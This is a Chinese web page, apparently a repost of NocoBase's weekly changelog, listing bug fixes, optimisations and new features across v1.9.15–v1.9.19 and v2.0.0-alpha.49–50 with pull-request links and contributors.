    NocoBase
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T04:17:29.000Z" title="Fri Dec 05 2025 04:17:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>原文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fweekly-updates-20251204" target="_blank" title="https://www.nocobase.com/cn/blog/weekly-updates-20251204" ref="nofollow noopener noreferrer">www.nocobase.com/cn/blog/wee…</a></p>
<p>汇总一周产品更新日志，最新发布可以<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Ftimeline" target="_blank" title="https://www.nocobase.com/cn/blog/timeline" ref="nofollow noopener noreferrer">前往我们的博客查看</a>。</p>
<p><strong>NocoBase 目前更新包括的版本更新包括三个分支：<code>main</code> ，<code>next</code>和 <code>develop</code>。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba1f52aca04546c29c74693d2de3f5f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513049&amp;x-signature=iKsiBTUgyNz3mMzIajiHVTwDUDI%3D" alt="version.png" loading="lazy"/></p>
<p><code>main</code> ：截止目前最稳定的版本，推荐安装此版本。</p>
<p><code>next</code>：包含即将发布的新功能，经过初步测试的版本，可能存在部分已知或未知问题。主要面向测试用户，用于收集反馈和进一步优化功能。适合愿意提前体验新功能并提供反馈的测试用户。</p>
<p><code>develop</code>：开发中的版本，包含最新的功能代码，可能尚未完成或存在较多不稳定因素，主要用于内部开发和快速迭代。适合对产品功能前沿发展感兴趣的技术用户，但可能存在较多问题或不完整功能，不建议在生产环境中使用。</p>
<h2 data-id="heading-0">main</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd404acd45934b0c8b18ee3ca2a9f504~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513049&amp;x-signature=sOc2E3vwK3XpW893m73f7SZ9Tns%3D" alt="main.png" loading="lazy"/></p>
<h3 data-id="heading-1"><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fv1.9.19" target="_blank" title="https://www.nocobase.com/cn/blog/v1.9.19" ref="nofollow noopener noreferrer">v1.9.19</a></h3>
<p><em>发布时间：2025-12-04</em></p>
<h3 data-id="heading-2">🐛 修复</h3>
<ul>
<li><strong>[工作流：审批]</strong>
<ul>
<li>修复加载审批列表时内存溢出的问题 by @mytharcher</li>
<li>修复审批人弹窗不显示标题的问题 by @zhangzhonghe</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3"><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fv1.9.18" target="_blank" title="https://www.nocobase.com/cn/blog/v1.9.18" ref="nofollow noopener noreferrer">v1.9.18</a></h3>
<p><em>发布时间：2025-12-04</em></p>
<h3 data-id="heading-4">🐛 修复</h3>
<ul>
<li>
<p><strong>[操作：导入记录]</strong> 导入的字段和导入权限设置的字段不匹配 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8075" target="_blank" title="https://github.com/nocobase/nocobase/pull/8075" ref="nofollow noopener noreferrer">#8075</a>) by @2013xile</p>
</li>
<li>
<p><strong>[工作流]</strong> 修复执行历史页面中当节点上的执行记录不存在时的报错 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8066" target="_blank" title="https://github.com/nocobase/nocobase/pull/8066" ref="nofollow noopener noreferrer">#8066</a>) by @mytharcher</p>
</li>
<li>
<p><strong>[权限控制]</strong> 给外部数据源添加数据表关联操作的权限判断中间件 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8062" target="_blank" title="https://github.com/nocobase/nocobase/pull/8062" ref="nofollow noopener noreferrer">#8062</a>) by @2013xile</p>
</li>
<li>
<p><strong>[工作流：审批]</strong></p>
<ul>
<li>修复在数据详情弹窗中加载相关审批时的权限报错 by @mytharcher</li>
<li>修复退回分支中无法使用审批节点结果中的审批记录数据的问题 by @mytharcher</li>
<li>修复分支模式和顺序会签时流程处理错误的问题 by @mytharcher</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5"><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fv1.9.17" target="_blank" title="https://www.nocobase.com/cn/blog/v1.9.17" ref="nofollow noopener noreferrer">v1.9.17</a></h3>
<p><em>发布时间：2025-12-02</em></p>
<h3 data-id="heading-6">🐛 修复</h3>
<ul>
<li><strong>[client]</strong> 修复联动规则下拉选择框闪烁的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8018" target="_blank" title="https://github.com/nocobase/nocobase/pull/8018" ref="nofollow noopener noreferrer">#8018</a>) by @zhangzhonghe</li>
<li><strong>[acl]</strong> 修复外部数据源的权限数据范围使用了当前用户相关变量时， acl meta 信息获取不正确的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8013" target="_blank" title="https://github.com/nocobase/nocobase/pull/8013" ref="nofollow noopener noreferrer">#8013</a>) by @2013xile</li>
<li><strong>[主题编辑器]</strong> 移动端支持切换主题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8046" target="_blank" title="https://github.com/nocobase/nocobase/pull/8046" ref="nofollow noopener noreferrer">#8046</a>) by @zhangzhonghe</li>
<li><strong>[多应用管理器]</strong> 设置日志级别，子应用不生效 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8045" target="_blank" title="https://github.com/nocobase/nocobase/pull/8045" ref="nofollow noopener noreferrer">#8045</a>) by @2013xile</li>
</ul>
<h3 data-id="heading-7"><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fv1.9.16" target="_blank" title="https://www.nocobase.com/cn/blog/v1.9.16" ref="nofollow noopener noreferrer">v1.9.16</a></h3>
<p><em>发布时间：2025-12-02</em></p>
<h3 data-id="heading-8">🎉 新特性</h3>
<ul>
<li><strong>[数据源：REST API]</strong> 在 restful api 数据源配置中新增<code>接口错误信息转换</code>配置项 by @cgyrock</li>
</ul>
<h3 data-id="heading-9">🚀 优化</h3>
<ul>
<li>
<p><strong>[client]</strong></p>
<ul>
<li>优化 Select 组件，鼠标悬停时显示被折叠的已选中选项 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8029" target="_blank" title="https://github.com/nocobase/nocobase/pull/8029" ref="nofollow noopener noreferrer">#8029</a>) by @katherinehhh</li>
<li>优化子表格字段的必填校验提示信息样式 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8001" target="_blank" title="https://github.com/nocobase/nocobase/pull/8001" ref="nofollow noopener noreferrer">#8001</a>) by @katherinehhh</li>
</ul>
</li>
<li>
<p><strong>[工作流]</strong> 为 UserSelect 组件增加主数据源上下文，以提供一个更通用的组件，可以在其他地方使用 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8010" target="_blank" title="https://github.com/nocobase/nocobase/pull/8010" ref="nofollow noopener noreferrer">#8010</a>) by @mytharcher</p>
</li>
<li>
<p><strong>[工作流：审批]</strong> 使用通用组件以减少重复代码 by @mytharcher</p>
</li>
</ul>
<h3 data-id="heading-10">🐛 修复</h3>
<ul>
<li>
<p><strong>[client]</strong> 修复 Variable.Input 组件的懒加载问题，该问题会导致变量选项菜单不正常的重渲染 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8009" target="_blank" title="https://github.com/nocobase/nocobase/pull/8009" ref="nofollow noopener noreferrer">#8009</a>) by @mytharcher</p>
</li>
<li>
<p><strong>[操作：导入记录]</strong> 修复导入时如果字段包含 <code>null</code> 值报错的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8037" target="_blank" title="https://github.com/nocobase/nocobase/pull/8037" ref="nofollow noopener noreferrer">#8037</a>) by @mytharcher</p>
</li>
<li>
<p><strong>[工作流]</strong> 修复发送消息之前队列已关闭的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8003" target="_blank" title="https://github.com/nocobase/nocobase/pull/8003" ref="nofollow noopener noreferrer">#8003</a>) by @mytharcher</p>
</li>
<li>
<p><strong>[工作流：子流程]</strong> 修复选择工作流组件在工作流列表超过 200 个之后展示不正常的问题 by @mytharcher</p>
</li>
<li>
<p><strong>[工作流：审批]</strong></p>
<ul>
<li>修复由于 <code>RemoteSelect</code> 组件变更导致的加载 <code>approvalRecords.reassignee</code> 资源的权限问题 by @mytharcher</li>
<li>修复审批详情弹窗在刷新页面后打印按钮无法工作的问题 by @mytharcher</li>
</ul>
</li>
</ul>
<h3 data-id="heading-11"><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fv1.9.15" target="_blank" title="https://www.nocobase.com/cn/blog/v1.9.15" ref="nofollow noopener noreferrer">v1.9.15</a></h3>
<p><em>发布时间：2025-11-28</em></p>
<h3 data-id="heading-12">🐛 修复</h3>
<ul>
<li>
<p><strong>[client]</strong></p>
<ul>
<li>避免打开字段默认值配置时的报错 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7997" target="_blank" title="https://github.com/nocobase/nocobase/pull/7997" ref="nofollow noopener noreferrer">#7997</a>) by @mytharcher</li>
<li>修复关系树表表格区块添加子记录时报错的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7989" target="_blank" title="https://github.com/nocobase/nocobase/pull/7989" ref="nofollow noopener noreferrer">#7989</a>) by @katherinehhh</li>
</ul>
</li>
<li>
<p><strong>[部门]</strong> 修复部门插件中的部门用户关联字段无法编辑的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7462" target="_blank" title="https://github.com/nocobase/nocobase/pull/7462" ref="nofollow noopener noreferrer">#7462</a>) by @heziqiang</p>
</li>
<li>
<p><strong>[数据表：树]</strong> 修复因树表父字段获取不正确导致路径表更新失败的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8000" target="_blank" title="https://github.com/nocobase/nocobase/pull/8000" ref="nofollow noopener noreferrer">#8000</a>) by @2013xile</p>
</li>
<li>
<p><strong>[数据表字段：多对多 (数组)]</strong> 修复子表格中多对多数组关系字段数据无法更新问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7998" target="_blank" title="https://github.com/nocobase/nocobase/pull/7998" ref="nofollow noopener noreferrer">#7998</a>) by @cgyrock</p>
</li>
<li>
<p><strong>[工作流：审批]</strong></p>
<ul>
<li>修复用户在撤回重新提交后，工作流上下文中缺少申请人数据的问题 by @mytharcher</li>
<li>修复用户带评论提交审批后在节点结果中评论为空的问题 by @mytharcher</li>
</ul>
</li>
</ul>
<h2 data-id="heading-13">develop</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/664ef607c52f4c599ef7aa493103ae4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513049&amp;x-signature=u3fopMcxhZpQts5VqBRYYRLyriY%3D" alt="develop.png" loading="lazy"/></p>
<h3 data-id="heading-14"><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fv2.0.0-alpha.50" target="_blank" title="https://www.nocobase.com/cn/blog/v2.0.0-alpha.50" ref="nofollow noopener noreferrer">v2.0.0-alpha.50</a></h3>
<p><em>发布时间：2025-12-02</em></p>
<h3 data-id="heading-15">🚀 优化</h3>
<ul>
<li>
<p><strong>[client]</strong></p>
<ul>
<li>附件上传组件支持“允许多选”设置 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8052" target="_blank" title="https://github.com/nocobase/nocobase/pull/8052" ref="nofollow noopener noreferrer">#8052</a>) by @katherinehhh</li>
<li>优化 Select 组件，鼠标悬停时显示被折叠的已选中选项 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8029" target="_blank" title="https://github.com/nocobase/nocobase/pull/8029" ref="nofollow noopener noreferrer">#8029</a>) by @katherinehhh</li>
<li>优化 Select 组件被折叠的选中项在鼠标悬停时显示出来 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8030" target="_blank" title="https://github.com/nocobase/nocobase/pull/8030" ref="nofollow noopener noreferrer">#8030</a>) by @katherinehhh</li>
</ul>
</li>
<li>
<p><strong>[AI 员工]</strong> 为添加 LLM 表单新增字段 provider (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8049" target="_blank" title="https://github.com/nocobase/nocobase/pull/8049" ref="nofollow noopener noreferrer">#8049</a>) by @heziqiang</p>
</li>
<li>
<p><strong>[工作流]</strong> 为 UserSelect 组件增加主数据源上下文，以提供一个更通用的组件，可以在其他地方使用 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8010" target="_blank" title="https://github.com/nocobase/nocobase/pull/8010" ref="nofollow noopener noreferrer">#8010</a>) by @mytharcher</p>
</li>
</ul>
<h3 data-id="heading-16">🐛 修复</h3>
<ul>
<li>
<p><strong>[client]</strong></p>
<ul>
<li>修复下拉选择关系对多禁用多选后显示 N/A 的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8050" target="_blank" title="https://github.com/nocobase/nocobase/pull/8050" ref="nofollow noopener noreferrer">#8050</a>) by @katherinehhh</li>
<li>修复联动规则下拉选择框闪烁的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8018" target="_blank" title="https://github.com/nocobase/nocobase/pull/8018" ref="nofollow noopener noreferrer">#8018</a>) by @zhangzhonghe</li>
<li>修复筛选操作中将日期字段切换到时间字段后渲染报错的问题。 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8036" target="_blank" title="https://github.com/nocobase/nocobase/pull/8036" ref="nofollow noopener noreferrer">#8036</a>) by @gchust</li>
<li>修复添加评论区块时出现当前记录菜单的问题。 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8039" target="_blank" title="https://github.com/nocobase/nocobase/pull/8039" ref="nofollow noopener noreferrer">#8039</a>) by @gchust</li>
<li>修复数据选择器区块批量删除数据失败问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8023" target="_blank" title="https://github.com/nocobase/nocobase/pull/8023" ref="nofollow noopener noreferrer">#8023</a>) by @katherinehhh</li>
<li>修复详情区块里的 JS field 默认样式不正确的问题。 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8031" target="_blank" title="https://github.com/nocobase/nocobase/pull/8031" ref="nofollow noopener noreferrer">#8031</a>) by @gchust</li>
<li>修复树表表格区块不能展开子节点的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8011" target="_blank" title="https://github.com/nocobase/nocobase/pull/8011" ref="nofollow noopener noreferrer">#8011</a>) by @katherinehhh</li>
<li>修复子表格列拖拽无效问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8026" target="_blank" title="https://github.com/nocobase/nocobase/pull/8026" ref="nofollow noopener noreferrer">#8026</a>) by @katherinehhh</li>
<li>修复子表格列宽设置无效问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8027" target="_blank" title="https://github.com/nocobase/nocobase/pull/8027" ref="nofollow noopener noreferrer">#8027</a>) by @katherinehhh</li>
<li>修复弹窗中关系字段数据加载导致报错的问题，确保数据展示和功能更流畅。 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7985" target="_blank" title="https://github.com/nocobase/nocobase/pull/7985" ref="nofollow noopener noreferrer">#7985</a>) by @gchust</li>
<li>修复 Markdown字段 Popover 样式问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8012" target="_blank" title="https://github.com/nocobase/nocobase/pull/8012" ref="nofollow noopener noreferrer">#8012</a>) by @katherinehhh</li>
<li>修复编辑操作和新增操作弹窗的默认标题不正确的问题。 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8033" target="_blank" title="https://github.com/nocobase/nocobase/pull/8033" ref="nofollow noopener noreferrer">#8033</a>) by @gchust</li>
<li>修复 Variable.Input 组件的懒加载问题，该问题会导致变量选项菜单不正常的重渲染 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8009" target="_blank" title="https://github.com/nocobase/nocobase/pull/8009" ref="nofollow noopener noreferrer">#8009</a>) by @mytharcher</li>
<li>修复无法正确解析关系字段打开的弹窗里的当前弹窗弹窗记录变量。 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8019" target="_blank" title="https://github.com/nocobase/nocobase/pull/8019" ref="nofollow noopener noreferrer">#8019</a>) by @gchust</li>
</ul>
</li>
<li>
<p><strong>[acl]</strong> 修复外部数据源的权限数据范围使用了当前用户相关变量时， acl meta 信息获取不正确的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8013" target="_blank" title="https://github.com/nocobase/nocobase/pull/8013" ref="nofollow noopener noreferrer">#8013</a>) by @2013xile</p>
</li>
<li>
<p><strong>[flow-engine]</strong></p>
<ul>
<li>修复评论编辑后更新保存失败的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8035" target="_blank" title="https://github.com/nocobase/nocobase/pull/8035" ref="nofollow noopener noreferrer">#8035</a>) by @katherinehhh</li>
<li>修复点击弹窗中表单提交按钮关闭弹窗时数据区块数据不刷新的问题。 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8021" target="_blank" title="https://github.com/nocobase/nocobase/pull/8021" ref="nofollow noopener noreferrer">#8021</a>) by @gchust</li>
</ul>
</li>
<li>
<p><strong>[主题编辑器]</strong> 移动端支持切换主题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8046" target="_blank" title="https://github.com/nocobase/nocobase/pull/8046" ref="nofollow noopener noreferrer">#8046</a>) by @zhangzhonghe</p>
</li>
<li>
<p><strong>[多应用管理器（已废弃）]</strong> 设置日志级别，子应用不生效 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8045" target="_blank" title="https://github.com/nocobase/nocobase/pull/8045" ref="nofollow noopener noreferrer">#8045</a>) by @2013xile</p>
</li>
<li>
<p><strong>[数据源管理]</strong> 修复外部数据源更新密码报错问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8024" target="_blank" title="https://github.com/nocobase/nocobase/pull/8024" ref="nofollow noopener noreferrer">#8024</a>) by @cgyrock</p>
</li>
<li>
<p><strong>[操作：导入记录]</strong> 修复导入时如果字段包含 <code>null</code> 值报错的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8037" target="_blank" title="https://github.com/nocobase/nocobase/pull/8037" ref="nofollow noopener noreferrer">#8037</a>) by @mytharcher</p>
</li>
<li>
<p><strong>[工作流]</strong> 修复发送消息之前队列已关闭的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8003" target="_blank" title="https://github.com/nocobase/nocobase/pull/8003" ref="nofollow noopener noreferrer">#8003</a>) by @mytharcher</p>
</li>
<li>
<p><strong>[评论]</strong></p>
<ul>
<li>修复评论区块删除记录失败的问题 by @katherinehhh</li>
<li>非评论表使用评论区块时显示提示“当前表不是评论表，无法使用评论区块” by @katherinehhh</li>
</ul>
</li>
<li>
<p><strong>[多空间]</strong> 移动端支持空间切换 by @jiannx</p>
</li>
<li>
<p><strong>[工作流：子流程]</strong> 修复选择工作流组件在工作流列表超过 200 个之后展示不正常的问题 by @mytharcher</p>
</li>
<li>
<p><strong>[工作流：审批]</strong></p>
<ul>
<li>修复创建审批信息区块报错的问题 by @mytharcher</li>
<li>为避免添加索引时重复数据的错误，增加迁移脚本 by @mytharcher</li>
<li>修复审批详情弹窗在刷新页面后打印按钮无法工作的问题 by @mytharcher</li>
</ul>
</li>
</ul>
<h3 data-id="heading-17"><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fv2.0.0-alpha.49" target="_blank" title="https://www.nocobase.com/cn/blog/v2.0.0-alpha.49" ref="nofollow noopener noreferrer">v2.0.0-alpha.49</a></h3>
<p><em>发布时间：2025-11-29</em></p>
<h3 data-id="heading-18">🎉 新特性</h3>
<ul>
<li><strong>[工作流：审批]</strong> 允许选择在审批处理界面中展示数据的快照还是最新状态 by @mytharcher</li>
</ul>
<h3 data-id="heading-19">🚀 优化</h3>
<ul>
<li><strong>[client]</strong> 优化子表格字段的必填校验提示信息样式 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8001" target="_blank" title="https://github.com/nocobase/nocobase/pull/8001" ref="nofollow noopener noreferrer">#8001</a>) by @katherinehhh</li>
<li><strong>[遥测：Prometheus]</strong> 升级 <code>@opentelemetry/exporter-prometheus</code> by @2013xile</li>
<li><strong>[操作：导入记录 Pro]</strong> 优化异步任务的错误信息，任务失败时将明确提示具体的错误原因 by @mytharcher</li>
</ul>
<h3 data-id="heading-20">🐛 修复</h3>
<ul>
<li><strong>[flow-engine]</strong> 修复详情区块中无法正确触发当前记录变量后端解析的问题。 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8004" target="_blank" title="https://github.com/nocobase/nocobase/pull/8004" ref="nofollow noopener noreferrer">#8004</a>) by @gchust</li>
<li><strong>[client]</strong> 修复联合主键表格区块选中和删除行无效的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F7978" target="_blank" title="https://github.com/nocobase/nocobase/pull/7978" ref="nofollow noopener noreferrer">#7978</a>) by @katherinehhh</li>
<li><strong>[操作：导出记录]</strong> 修复导出按钮可导出字段列表缺少系统字段的问题 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase%2Fpull%2F8002" target="_blank" title="https://github.com/nocobase/nocobase/pull/8002" ref="nofollow noopener noreferrer">#8002</a>) by @katherinehhh</li>
